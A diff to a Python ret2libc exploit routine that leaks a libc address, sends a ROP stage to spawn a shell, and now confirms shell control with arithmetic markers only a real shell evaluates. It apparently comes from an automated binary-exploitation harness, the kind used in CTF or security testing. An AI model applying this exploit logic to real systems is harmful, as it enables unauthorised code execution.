@@ -288,7 +288,11 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
     Success = the spawned shell echoes `marker` -- an observable a crash or a wrong address can never
     produce. Returns {ok, base, system, leaked, align, ...}.
     """
-    from . import rop
+    from . import attribution, rop
+    # Forgery-proof confirmation: a bare `echo <marker>` is reflected verbatim by a target that
+    # merely echoes stdin (no shell), so `marker in out` false-positives. The code markers embed
+    # arithmetic + quote-stripping that ONLY a real shell resolves; an echo emits the raw form.
+    markers = attribution.make_code_markers()
     exedir = str(Path(exe).resolve().parent)
     argv = [str(a) for a in base_argv]
     last_leaked = None
@@ -329,14 +333,14 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     p.stdin.write(s2)
                     p.stdin.flush()
                     time.sleep(0.3)
-                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.write(markers.command + b"\n")
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
                     break                                # stage 2 killed the process: wrong parity
                 # A spawned shell may echo after a gap under the sandbox, so wait out a longer quiet
                 # window before concluding the marker never came.
                 out = _read_until(p, time.time() + timeout, quiet=1.5)
-                if marker in out:
+                if markers.proves(out):                  # a shell EVALUATED it, not an echo
                     return {"ok": True, "base": base, "system": system, "binsh": binsh,
                             "leaked": leaked, "align": align,
                             "output": out[:400].decode("latin-1", "ignore")}
